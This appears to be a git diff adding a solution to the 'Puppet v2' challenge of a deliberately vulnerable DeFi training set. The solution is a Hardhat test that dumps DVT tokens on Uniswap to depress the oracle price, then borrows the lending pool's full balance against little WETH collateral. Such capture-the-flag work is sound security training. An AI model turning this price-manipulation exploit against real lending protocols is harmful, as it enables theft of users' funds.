@@ -83,6 +83,30 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // const PuppetHackFactory = await ethers.getContractFactory('PuppetV2Hack', player);
+        // const puppetHack = await PuppetHackFactory.deploy(player.address, token.address, weth.address, exchange.address, 
+        //     pool.address);
+        const amountIn = 10000n * 10n ** 18n;
+        await token.connect(player).approve(uniswapRouter.address, amountIn);
+        const amountOutMin = 9n * 10n ** 18n;
+        const path = [token.address, weth.address];
+        const to = player.address;
+        const deadline = (await ethers.provider.getBlock('latest')).timestamp*2;
+        // Swap 10000 DVT tokens to reduce the price of DVT and get ETH
+        console.log("WETH balance before: ", (await weth.balanceOf(player.address)).toString());
+        await uniswapRouter.connect(player).swapExactTokensForTokens(amountIn, amountOutMin, path, to, deadline);
+        const wethBalance = await weth.balanceOf(player.address);
+       
+        const borrowAmount = POOL_INITIAL_TOKEN_BALANCE;
+        // Borrow million DVT tokens from the pool by providing the 3X required WETH
+        const collateralRequired = await lendingPool.calculateDepositOfWETHRequired(borrowAmount);
+        const depositValue = (collateralRequired - wethBalance).toString();
+        console.log("Amount of wei required: ", collateralRequired.toString());
+        // Get WETH from the pool by providing the equivalent amount of ETH
+        await weth.connect(player).deposit({ value: depositValue });
+        await weth.connect(player).approve(lendingPool.address, collateralRequired);
+        await lendingPool.connect(player).borrow(borrowAmount);
+        // Take all the liquidity from the pool
     });
 
     after(async function () {
